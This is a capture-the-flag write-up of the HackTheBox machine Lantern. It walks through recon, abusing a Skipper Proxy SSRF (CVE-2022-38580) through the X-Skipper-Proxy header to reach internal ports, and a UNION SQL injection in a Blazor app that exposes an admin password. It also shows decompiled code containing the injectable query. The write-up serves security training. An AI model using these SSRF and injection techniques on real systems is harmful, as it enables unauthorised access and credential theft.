---
title: HTB: Lantern
url: https://0xdf.gitlab.io/2024/11/30/htb-lantern.html
date: 2024-11-30T14:45:00+00:00
difficulty: Hard [40]
os: Linux
tags: ctf, hackthebox, htb-lantern, nmap, python, flask, dotnet, blazor, blazor-traffic-processor, feroxbuster, ssrf, skipper-proxy, cve-2022-38580, ffuf, burp, burp-repeater, header-editor, sqli, sqli-union, reverse-engineering, dotpeek, upload, arbitrary-write, dll, directory-traversal, razor, visual-studio, procmon, procmon-linux, sqlite, htb-blazorized
---

![Lantern](/img/lantern-cover.png)

Lantern starts out with two websites. The first is a Flask website served over Skipper proxy, and the other is a Blazor site on .NET on Linux. I’ll abuse an SSRF in Skipper to get access to an internal Blazor admin site. From there I can get an admin password, either via SQL injection or via reverse-engineering a DLL. On the admin page, I’ll get file write and upload a malicious Razor DLL component to get a reverse shell. For root, I’l get access to a ProcMon SQLite database and find a root password in the logged events.

## Box Info

| Name | [Lantern](https://hackthebox.com/machines/lantern)  [Lantern](https://hackthebox.com/machines/lantern) [Play on HackTheBox](https://hackthebox.com/machines/lantern) |
| --- | --- |
| Release Date | [17 Aug 2024](https://twitter.com/hackthebox_eu/status/1824113863622582491) |
| Retire Date | 30 Nov 2024 |
| OS | Linux Linux |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for Lantern |
| Radar Graph | Radar chart for Lantern |
| First Blood User | 01:21:34[NLTE NLTE](https://app.hackthebox.com/users/260094) |
| First Blood Root | 02:11:36[pottm pottm](https://app.hackthebox.com/users/141036) |
| Creator | [clv clv](https://app.hackthebox.com/users/298338) |

## Recon

### nmap

`nmap` finds three open TCP ports, SSH (22) and two HTTP (80, 3000):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.29
Starting Nmap 7.80 ( https://nmap.org ) at 2024-08-21 11:10 EDT
Nmap scan report for 10.10.11.29
Host is up (0.085s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp

Nmap done: 1 IP address (1 host up) scanned in 6.97 seconds
oxdf@hacky$ nmap -p 22,80,3000 -sCV 10.10.11.29
Starting Nmap 7.80 ( https://nmap.org ) at 2024-08-21 11:11 EDT
Nmap scan report for 10.10.11.29
Host is up (0.085s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Skipper Proxy
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 404 Not Found
|     Content-Length: 207
|     Content-Type: text/html; charset=utf-8
|     Date: Wed, 21 Aug 2024 15:11:47 GMT
|     Server: Skipper Proxy
|     <!doctype html>
|     <html lang=en>
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 302 Found
|     Content-Length: 225
|     Content-Type: text/html; charset=utf-8
|     Date: Wed, 21 Aug 2024 15:11:42 GMT
|     Location: http://lantern.htb/
|     Server: Skipper Proxy
|     <!doctype html>
|     <html lang=en>
|     <title>Redirecting...</title>
|     <h1>Redirecting...</h1>
|     <p>You should be redirected automatically to the target URL: <a href="http://lantern.htb/">http://lantern.htb/</a>. If not, click the link.
|   HTTPOptions:
|     HTTP/1.0 200 OK
|     Allow: HEAD, GET, OPTIONS
|     Content-Length: 0
|     Content-Type: text/html; charset=utf-8
|     Date: Wed, 21 Aug 2024 15:11:42 GMT
|_    Server: Skipper Proxy
|_http-server-header: Skipper Proxy
|_http-title: Did not follow redirect to http://lantern.htb/
3000/tcp open  ppp?
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 500 Internal Server Error
|     Connection: close
|     Content-Type: text/plain; charset=utf-8
|     Date: Wed, 21 Aug 2024 15:11:47 GMT
|     Server: Kestrel
|     System.UriFormatException: Invalid URI: The hostname could not be parsed.
|     System.Uri.CreateThis(String uri, Boolean dontEscape, UriKind uriKind, UriCreationOptions& creationOptions)
|     System.Uri..ctor(String uriString, UriKind uriKind)
|     Microsoft.AspNetCore.Components.NavigationManager.set_BaseUri(String value)
|     Microsoft.AspNetCore.Components.NavigationManager.Initialize(String baseUri, String uri)
|     Microsoft.AspNetCore.Components.Server.Circuits.RemoteNavigationManager.Initialize(String baseUri, String uri)
|     Microsoft.AspNetCore.Mvc.ViewFeatures.StaticComponentRenderer.<InitializeStandardComponentServicesAsync>g__InitializeCore|5_0(HttpContext httpContext)
|     Microsoft.AspNetCore.Mvc.ViewFeatures.StaticC
|   HTTPOptions:
|     HTTP/1.1 200 OK
|     Content-Length: 0
|     Connection: close
|     Date: Wed, 21 Aug 2024 15:11:52 GMT
|     Server: Kestrel
|   Help:
|     HTTP/1.1 400 Bad Request
|     Content-Length: 0
|     Connection: close
|     Date: Wed, 21 Aug 2024 15:11:47 GMT
|     Server: Kestrel
|   RTSPRequest:
|     HTTP/1.1 505 HTTP Version Not Supported
|     Content-Length: 0
|     Connection: close
|     Date: Wed, 21 Aug 2024 15:11:52 GMT
|     Server: Kestrel
|   SSLSessionReq, TerminalServerCookie:
|     HTTP/1.1 400 Bad Request
|     Content-Length: 0
|     Connection: close
|     Date: Wed, 21 Aug 2024 15:12:08 GMT
|_    Server: Kestrel
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.80%I=7%D=8/21%Time=66C603AE%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,18F,"HTTP/1\.0\x20302\x20Found\r\nContent-Length:\x20225\r\nCont
SF:ent-Type:\x20text/html;\x20charset=utf-8\r\nDate:\x20Wed,\x2021\x20Aug\
SF:x202024\x2015:11:42\x20GMT\r\nLocation:\x20http://lantern\.htb/\r\nServ
SF:er:\x20Skipper\x20Proxy\r\n\r\n<!doctype\x20html>\n<html\x20lang=en>\n<
SF:title>Redirecting\.\.\.</title>\n<h1>Redirecting\.\.\.</h1>\n<p>You\x20
SF:should\x20be\x20redirected\x20automatically\x20to\x20the\x20target\x20U
SF:RL:\x20<a\x20href=\"http://lantern\.htb/\">http://lantern\.htb/</a>\.\x
SF:20If\x20not,\x20click\x20the\x20link\.\n")%r(HTTPOptions,A5,"HTTP/1\.0\
SF:x20200\x20OK\r\nAllow:\x20HEAD,\x20GET,\x20OPTIONS\r\nContent-Length:\x
SF:200\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nDate:\x20Wed,\x2
SF:021\x20Aug\x202024\x2015:11:42\x20GMT\r\nServer:\x20Skipper\x20Proxy\r\
SF:n\r\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent
SF:-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n4
SF:00\x20Bad\x20Request")%r(FourOhFourRequest,162,"HTTP/1\.0\x20404\x20Not
SF:\x20Found\r\nContent-Length:\x20207\r\nContent-Type:\x20text/html;\x20c
SF:harset=utf-8\r\nDate:\x20Wed,\x2021\x20Aug\x202024\x2015:11:47\x20GMT\r
SF:\nServer:\x20Skipper\x20Proxy\r\n\r\n<!doctype\x20html>\n<html\x20lang=
SF:en>\n<title>404\x20Not\x20Found</title>\n<h1>Not\x20Found</h1>\n<p>The\
SF:x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x20server\.\x20
SF:If\x20you\x20entered\x20the\x20URL\x20manually\x20please\x20check\x20yo
SF:ur\x20spelling\x20and\x20try\x20again\.</p>\n")%r(GenericLines,67,"HTTP
SF:/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20chars
SF:et=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Help,
SF:67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\
SF:x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")
SF:%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type
SF::\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x2
SF:0Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.1\x20400\x20Bad\x2
SF:0Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection
SF::\x20close\r\n\r\n400\x20Bad\x20Request");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3000-TCP:V=7.80%I=7%D=8/21%Time=66C603B3%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,114E,"HTTP/1\.1\x20500\x20Internal\x20Server\x20Error\r\nConne
SF:ction:\x20close\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nDat
SF:e:\x20Wed,\x2021\x20Aug\x202024\x2015:11:47\x20GMT\r\nServer:\x20Kestre
SF:l\r\n\r\nSystem\.UriFormatException:\x20Invalid\x20URI:\x20The\x20hostn
SF:ame\x20could\x20not\x20be\x20parsed\.\n\x20\x20\x20at\x20System\.Uri\.C
SF:reateThis\(String\x20uri,\x20Boolean\x20dontEscape,\x20UriKind\x20uriKi
SF:nd,\x20UriCreationOptions&\x20creationOptions\)\n\x20\x20\x20at\x20Syst
SF:em\.Uri\.\.ctor\(String\x20uriString,\x20UriKind\x20uriKind\)\n\x20\x20
SF:\x20at\x20Microsoft\.AspNetCore\.Components\.NavigationManager\.set_Bas
SF:eUri\(String\x20value\)\n\x20\x20\x20at\x20Microsoft\.AspNetCore\.Compo
SF:nents\.NavigationManager\.Initialize\(String\x20baseUri,\x20String\x20u
SF:ri\)\n\x20\x20\x20at\x20Microsoft\.AspNetCore\.Components\.Server\.Circ
SF:uits\.RemoteNavigationManager\.Initialize\(String\x20baseUri,\x20String
SF:\x20uri\)\n\x20\x20\x20at\x20Microsoft\.AspNetCore\.Mvc\.ViewFeatures\.
SF:StaticComponentRenderer\.<InitializeStandardComponentServicesAsync>g__I
SF:nitializeCore\|5_0\(HttpContext\x20httpContext\)\n\x20\x20\x20at\x20Mic
SF:rosoft\.AspNetCore\.Mvc\.ViewFeatures\.StaticC")%r(Help,78,"HTTP/1\.1\x
SF:20400\x20Bad\x20Request\r\nContent-Length:\x200\r\nConnection:\x20close
SF:\r\nDate:\x20Wed,\x2021\x20Aug\x202024\x2015:11:47\x20GMT\r\nServer:\x2
SF:0Kestrel\r\n\r\n")%r(HTTPOptions,6F,"HTTP/1\.1\x20200\x20OK\r\nContent-
SF:Length:\x200\r\nConnection:\x20close\r\nDate:\x20Wed,\x2021\x20Aug\x202
SF:024\x2015:11:52\x20GMT\r\nServer:\x20Kestrel\r\n\r\n")%r(RTSPRequest,87
SF:,"HTTP/1\.1\x20505\x20HTTP\x20Version\x20Not\x20Supported\r\nContent-Le
SF:ngth:\x200\r\nConnection:\x20close\r\nDate:\x20Wed,\x2021\x20Aug\x20202
SF:4\x2015:11:52\x20GMT\r\nServer:\x20Kestrel\r\n\r\n")%r(SSLSessionReq,78
SF:,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x200\r\nConnect
SF:ion:\x20close\r\nDate:\x20Wed,\x2021\x20Aug\x202024\x2015:12:08\x20GMT\
SF:r\nServer:\x20Kestrel\r\n\r\n")%r(TerminalServerCookie,78,"HTTP/1\.1\x2
SF:0400\x20Bad\x20Request\r\nContent-Length:\x200\r\nConnection:\x20close\
SF:r\nDate:\x20Wed,\x2021\x20Aug\x202024\x2015:12:08\x20GMT\r\nServer:\x20
SF:Kestrel\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.37 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) version, the host is likely running Ubuntu 22.04 jammy.

Port 80 is showing “Skipper Proxy”. Port 3000 seems to be returning lots of errors based on the `nmap` responses. It also shows some .NET-related strings.

### Website - TCP 80

#### Site

Visiting `http://10.10.11.29` redirects to `lantern.htb`. I’ll do a quick `ffuf` brute force to look for any subdomains that respond differently, but not find any. I’ll add this domain to my `/etc/hosts` file:

```
10.10.11.29 lantern.htb

```

The site is for a IT solutions company:

![image-20240821112526569](/img/image-20240821112526569.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

The links on the top of the page go nowhere except for “Vacancies”, which leads to `/vacancies`:

![image-20240821112749628](/img/image-20240821112749628.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

The skills mention are:
- Vue.js, JQuery, ExpressJS
- React, Ant, Node.js
- PHP, Symfony, Laravel
- MySQL, PostgreSQL
- RabbitMQ
- ELK
- Reddis
- C3, .NET
- Git, CI/CD

There’s also a form to submit a resume. Submitting without an attachments shows:

![image-20240821113649919](/img/image-20240821113649919.png)

If I try to include something that isn’t a PDF as an attachment, it says:

![image-20240821113044486](/img/image-20240821113044486.png)

#### Tech Stack

The HTTP response headers show Skipper Proxy:

```

HTTP/1.1 200 OK
Content-Length: 12049
Content-Type: text/html; charset=utf-8
Date: Wed, 21 Aug 2024 15:35:12 GMT
Server: Skipper Proxy
Connection: close

```

That is likely [this opensource project](https://github.com/zalando/skipper). I’m not able to guess an extension for any of the pages, but the 404 page is the default [Python Flask 404 page](/cheatsheets/404#flask):

![image-20240821114020652](/img/image-20240821114020652.png)

#### Directory Brute Force

I’ll run `feroxbuster` against the site:

```

oxdf@hacky$ feroxbuster -u http://lantern.htb

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.4
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://lantern.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.4
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        5l       31w      207c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      225l      836w    12049c http://lantern.htb/
405      GET        5l       20w      153c http://lantern.htb/submit
200      GET      238l      676w    10713c http://lantern.htb/vacancies
[####################] - 2m     30000/30000   0s      found:3       errors:0
[####################] - 2m     30000/30000   210/s   http://lantern.htb/ 

```

It finds the vacancies page I already know about, and `/submit` is what gets the POST request from the form to apply for a job.

### Website - TCP 3000

#### Site

The site on 3000 just offers a login form for the admin page:

![image-20240821115002696](/img/image-20240821115002696.png)

I don’t have creds or any way around it at this point.

#### Tech Stack

The HTTP response headers don’t show Skipper, but another unusual server, Kestrel:

```

HTTP/1.1 200 OK
Connection: close
Content-Type: text/html; charset=utf-8
Date: Wed, 21 Aug 2024 15:44:01 GMT
Server: Kestrel
Cache-Control: no-cache, no-store, max-age=0
Content-Length: 2872

```

KestrelHttpServer is a webserver for ASP.NET core applications. It’s [GitHub page](https://github.com/aspnet/KestrelHttpServer) was archived in 2018, as it has since been integrated into [aspnetcore](https://github.com/dotnet/aspnetcore).

The page source shows comments related to [Blazor](https://dotnet.microsoft.com/en-us/apps/aspnet/web-apps/blazor), as well as a `blazor.server.js` file that’s loaded:

![image-20240821115413509](/img/image-20240821115413509.png)

Blazor is a .NET / C# framework that handles both client and server-side for a website. I went into some detail with Blazor recently on [Blazorized](/2024/11/09/htb-blazorized.html#).

The 404 page returns the [Blazor 404 component](/cheatsheets/404#blazor):

![image-20240821115613496](/img/image-20240821115613496.png)

Searching for that shows a bunch of references to Blazor as well:

![image-20240821115833237](/img/image-20240821115833237.png)

I’ll also note that on loading this page, the last request to `_blazor` results in a 101 response:

![image-20240821144449086](/img/image-20240821144449086.png)

That’s typically where a websocket has started, and there are now messages in the “WebSockets history” panel in Burp:

![image-20240821144526782](/img/image-20240821144526782.png)

The messages look like a binary format. When I enter a username into the form, there’s a message that reports that to the server:

![image-20240821144734933](/img/image-20240821144734933.png)

A similar message when I enter a password:

![image-20240821144758420](/img/image-20240821144758420.png)

Clicking submit sends:

![image-20240821144834969](/img/image-20240821144834969.png)

And the response is:

![image-20240821144849473](/img/image-20240821144849473.png)

It’s clear there’s a binary format here and some strings are visible in it.

It’s also worth noting that sometimes it doesn’t switch to websockets, but stays in an HTTP polling mode. The messages are the same, just not over websockets.

#### Directory Brute Force

`feroxbuster` finds only an error page:

```

oxdf@hacky$ feroxbuster -u http://lantern.htb:3000
                                                                                                         
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.4
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://lantern.htb:3000
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.4
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       58l      117w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        0l        0w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       37l      110w     1490c http://lantern.htb:3000/error
200      GET       37l      110w     1490c http://lantern.htb:3000/Error
[####################] - 53s    30000/30000   0s      found:2       errors:0
[####################] - 53s    30000/30000   563/s   http://lantern.htb:3000/ 

```

It’s worth noting that it seems case-insensitive (which I typically think of as associated with Windows, but perhaps that’s the .NET coming through).

`/error` offers information about the error:

![image-20240821120025235](/img/image-20240821120025235.png)

## Shell as tomas

### Access InternalLantern

#### Identify SSRF

Searching for vulnerabilities in Skipper Proxy finds multiple references to a server-side request forgery (SSRF) vulnerability:

![image-20240821124356272](/img/image-20240821124356272.png)

#### CVE-2022-38580 Background

[This advsiory](https://github.com/zalando/skipper/security/advisories/GHSA-f2rj-m42r-6jm2) labels it as [CVE-2022-38580](https://nvd.nist.gov/vuln/detail/CVE-2022-38580), and describes the vulnerability as:

> Skipper prior to version v0.13.236 is vulnerable to server-side request forgery (SSRF). An attacker can exploit a vulnerable version of proxy to access the internal metadata server or other unauthenticated URLs by adding an specific header (X-Skipper-Proxy) to the http request.

The [ExploitDB link](https://www.exploit-db.com/exploits/51111) shows exploiting this to read from the internal metadata server used by cloud vms:

![image-20240821124704419](/img/image-20240821124704419.png)

But it doesn’t have to be that site. Any host given in the `X-Skipper-Proxy` header will be used alone with the path from the request to fetch the page.

#### Lantern POC

To test this, I’ll get a request in Burp Repeater, setting the path to something interesting and the `X-Skipper-Proxy` header to my host:

![image-20240821124855003](/img/image-20240821124855003.png)

Sending it hits at my Python webserver:

```
10.10.11.29 - - [21/Aug/2024 12:48:34] code 404, message File not found
10.10.11.29 - - [21/Aug/2024 12:48:34] "GET http://lantern.htb/test/path/0xdf?foo=bar HTTP/1.1" 404 -

```

The request is from Lantern, and I have full control over the host and full URL.

I can also check for loading pages from Lantern. Loading the page on 80 returns the main site:

![image-20240821125047286](/img/image-20240821125047286.png)

The site on 3000 doesn’t render, but it shows the same HTML I noted [above](https://0xdf.gitlab.oi/2024/11/30/htb-lantern.html#tech-stack-1):

![image-20240821125140347](/img/image-20240821125140347.png)

#### Port Fuzz

I’ll check for other ports that are open on localhost hoping to find some I can’t access directly.

```

oxdf@hacky$ ffuf -u http://lantern.htb -H "X-Skipper-Proxy: http://127.0.0.1:FUZZ" -w <(seq 0 65535) -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://lantern.htb
 :: Wordlist         : FUZZ: /dev/fd/63
 :: Header           : X-Skipper-Proxy: http://127.0.0.1:FUZZ
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

22                      [Status: 500, Size: 22, Words: 3, Lines: 2, Duration: 127ms]
80                      [Status: 200, Size: 12049, Words: 4549, Lines: 225, Duration: 101ms]
3000                    [Status: 200, Size: 2852, Words: 334, Lines: 58, Duration: 101ms]
5000                    [Status: 200, Size: 1669, Words: 389, Lines: 50, Duration: 91ms]
8000                    [Status: 200, Size: 12049, Words: 4549, Lines: 225, Duration: 98ms]
:: Progress: [65536/65536] :: Job [1/1] :: 466 req/sec :: Duration: [0:02:23] :: Errors: 0 ::

```

It finds the three ports I already had access to (22, 80, and 3000), as well as two more (5000 and 8000).

Port 8000 is the same page as 80:

![image-20240821130450667](/img/image-20240821130450667.png)

I suspect that 80 is Skipper Proxy, and 8000 is the actual site.

Port 5000 has a different Blazor page:

![image-20240821130618428](/img/image-20240821130618428.png)

It looks very similar to port 3000, but it loads `blazor.webassembly.js` rather than `blazor.server.js`, and the title is “InternaLantern” rather than no title like the admin page.

#### Proxy

I want to load pages via this SSRF. For each request, all I need to do is add the header to each request, and it will switch from the public site to the site set in the header. I’ll install the [Header Editor](https://addons.mozilla.org/en-US/firefox/addon/header-editor/) plugin to Firefox, and set it to always add the header when enabled:

![image-20240821135005257](/img/image-20240821135005257.png)

With this rule enabled, I’ll refresh the browser on `lantern.htb` and get the internal site.

### Intenral Page Enumeration

The internal site is a HR-app:

![image-20240821135108956](/img/image-20240821135108956.png)

The “Add Employee” form works:

![image-20240821135533244](/img/image-20240821135533244.png)

The “Additional internal information” field doesn’t seem to get displayed back, and nothing here writes to the last column.

The “Book Vacation” tab has a form for that:

![image-20240821140236978](/img/image-20240821140236978.png)

On entering an ID and clicking “Search”, it returns if that’s valid. For example:

![image-20240821140316242](/img/image-20240821140316242.png)

With a valid ID:

![image-20240821135716045](/img/image-20240821135716045.png)

On submitting, it shows up on the page:

![image-20240821135737798](/img/image-20240821135737798.png)

### Recover Admin Password via SQLI

#### SQLI POC

The add employee form seems robust against SQL injection, as each of the fields just show strings with single and double quotes in them. However, the search in the vacation form errors out:

![image-20240821140437450](/img/image-20240821140437450.png)

That looks like SQL injection. I can comment out whatever comes after the break, and it works again:

![image-20240821140517279](/img/image-20240821140517279.png)

That suggests that the query is something like:

```

select * from users where userid = '{input}';

```

Then when it gets “QEACQ’ – -“, that makes:

```

select * from users where userid = 'QEACQ' -- -';

```

Since the extra single quote is after the comment, it works again.

I’ll check for UNION injection:

![image-20240821140806013](/img/image-20240821140806013.png)

With three columns it works:

![image-20240821140750438](/img/image-20240821140750438.png)

#### DB Type / Version

The error with one column also shows it is running SQLite. SQLite uses `sqlite_version()`:

![image-20240821141314733](/img/image-20240821141314733.png)

It’s SQLite version 3.37.2. Interestingly, there is no network traffic being sent during these queries, as Blazor is actually setting up a virtualized instance of SQLite inside the browser.

#### Dump Schema

A neat trick with SQLite is that it stores the schema for each table in the `sqlite_schema` table `sql` column. So with `count` I can see there are two tables:

![image-20240821141851984](/img/image-20240821141851984.png)

I’ll use the `group_concat` function to dump these:

![image-20240821141919470](/img/image-20240821141919470.png)

#### Employees Table

There are ten employees in the table (the last four created by me):

![image-20240821142324962](/img/image-20240821142324962.png)

Checking out the `InternalInfo` column, there are creds for a system administrator:

![image-20240821142511809](/img/image-20240821142511809.png)

The username admin with the password “AJbFA\_Q@925p9ap#22” work to log into the site on 3000.

### Recover Admin Password via Local DB

#### Recover Dll

When I load the InternalLantern page, there are a *ton* of dll files downloaded as part of the page load. A lot of them are library dlls, not custom to Lantern. But towards the end there’s an interesting one:

![image-20240822060120265](/img/image-20240822060120265.png)

I’ll download a copy to take a look at.

#### InternalLantern.dll

I’ll switch to a Windows VM and open the binary in [DotPeek](https://www.jetbrains.com/decompiler/) (though [IlSply](https://github.com/icsharpcode/ILSpy) on Linux will work as well, but I hear doesn’t make as nice a solution as DotPeek for this case). The binary has five namespaces:

![image-20240822060829320](/img/image-20240822060829320.png)

This is the full application that runs clientside in the browser. The interesting data here is in the `InternalLantern.Pages` namespace. The `Internal` and `Vacancy` classes defines those pages.

`Vacancy` is the simpler of the two pages, with only a single function mapped to the `/vacancies` route:

```

using Microsoft.AspNetCore.Components;
using Microsoft.AspNetCore.Components.Rendering;

namespace InternaLantern.Pages
{
  [Route("/vacancies")]
  public class Vacancies : ComponentBase
  {
    protected override void BuildRenderTree(RenderTreeBuilder __builder)
    {
      __builder.AddMarkupContent(0, "<style>\r\n        body {\r\n            background-color: #343a40; \r\n            color: #fff; \r\n        }\r\n\r\n        .vacancies-container {\r\n            padding: 20px;\r\n            background-color: #212529; \r\n            border-radius: 10px;\r\n            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);\r\n            margin: 20px auto;\r\n            max-width: 600px;\r\n        }\r\n\r\n        .vacancy {\r\n            border-bottom: 1px solid #fff;\r\n            padding: 10px 0;\r\n        }\r\n    </style>\r\n\r\n    ");
      __builder.AddMarkupContent(1, "<div class=\"container vacancies-container\"><h2 class=\"mb-4\">Available Vacancies</h2>\r\n    <div class=\"vacancy\"><h4>Middle Frontend Developer</h4>\r\n        <p>Experience: 2+ years</p>\r\n        <p>Location: Anywhere</p>\r\n        <p>Description: Strong knowledge in JavaScript, HTML, SCSS. \r\n            <br> \r\n            Upper-Intermediate English level.\r\n            <br>\r\n            Node.js, React Native, Ant Design ...\r\n       </p></div>\r\n    <div class=\"vacancy\"><h4>Backend Engineer</h4>\r\n        <p>Experience: 5+ years</p>\r\n        <p>Location: London</p>\r\n        <p>Description: PHP (Symfony and Laravel frameworks).\r\n            <br>\r\n            MySQL, PostgreSQL, Redis, ELK stack.\r\n             <br>\r\n             Strong technical expertise, understanding of system design.\r\n        </p></div>\r\n    <div class=\"vacancy\"><h4>Junior .NET Software Engineer</h4>\r\n        <p>Experience: 1+ year</p>\r\n        <p>Location: Anywhere</p>\r\n        <p>\r\n            Strong programming skills in C#, .NET Framework /.NET 6, ASP.NET Core, Win Forms\r\n            <br>\r\n            English: Upper-intermediate or higher\r\n             <br>\r\n            Experience with Source Control (GIT/Azure DevOps) and basics of CI/CD\r\n        </p></div></div>");
    }
  }
}

```

The class inherits from the `ComponentBase` class. That class provides most the functions, though here it overwrites the `BuildRenderTree` function, which renders the page by adding the components to it.

The `Internal` class is similar, but with many more functions:

![image-20240822061459423](/img/image-20240822061459423.png)

These functions account for both the main employees page as well as the vacation submission page. For example, the `SearchByUid` function is where the SQL injection above occurs:

```

    private async Task SearchByUid(string UID)
    {
      SqliteConnection db = new SqliteConnection("Data Source=Data.db");
      object obj1 = (object) null;
      int num1 = 0;
      SqliteCommand cmd;
      try
      {
        await ((DbConnection) db).OpenAsync();
        cmd = new SqliteCommand("SELECT Id, Name, SecondName FROM employees WHERE Uid = '" + UID + "'", db);
        object obj2 = (object) null;
        int num2 = 0;
        try
        {
          this.ErrorMessage = "";
          this.bookinfo = "";
          this.IsEmplSelected = false;
          try
          {
            SqliteDataReader reader = await cmd.ExecuteReaderAsync();
            try
            {
              if (((DbDataReader) reader).HasRows)
              {
                this.IsEmplSelected = true;
                while (true)
                {
                  if (await ((DbDataReader) reader).ReadAsync())
                  {
                    string Name = ((DbDataReader) reader).GetString(1);
                    string SecondName = ((DbDataReader) reader).GetString(2);
                    this.bookinfo = "Name: " + Name + ", Second Name: " + SecondName;
                    this._primkeyid = int.Parse(((DbDataReader) reader).GetString(0));
                    Name = (string) null;
                    SecondName = (string) null;
                  }
                  else
                    break;
                }
              }
              else
                this.ErrorMessage = "Employee not found!";
            }
            finally
            {
              if (reader != null)
                await ((IAsyncDisposable) reader).DisposeAsync();
            }
            reader = (SqliteDataReader) null;
          }
          catch (Exception ex)
          {
            this.ErrorMessage = ex.Message;
          }
          num2 = 1;
        }
        catch (object ex)
        {
          obj2 = ex;
        }
        if (cmd != null)
          await ((IAsyncDisposable) cmd).DisposeAsync();
        object obj = obj2;
        if (obj != null)
        {
          if (!(obj is Exception source))
            throw obj;
          ExceptionDispatchInfo.Capture(source).Throw();
        }
        if (num2 != 1)
          obj2 = (object) null;
        else
          num1 = 1;
      }
      catch (object ex)
      {
        obj1 = ex;
      }
      if (db != null)
        await ((IAsyncDisposable) db).DisposeAsync();
      object obj3 = obj1;
      if (obj3 != null)
      {
        if (!(obj3 is Exception source))
          throw obj3;
        ExceptionDispatchInfo.Capture(source).Throw();
      }
      if (num1 == 1)
      {
        db = (SqliteConnection) null;
        cmd = (SqliteCommand) null;
      }
      else
      {
        obj1 = (object) null;
        db = (SqliteConnection) null;
        cmd = (SqliteCommand) null;
        db = (SqliteConnection) null;
        cmd = (SqliteCommand) null;
      }
    }

```

A particularly interesting function is `OnInitializedAsync`:

```

    protected override async Task OnInitializedAsync()
    {
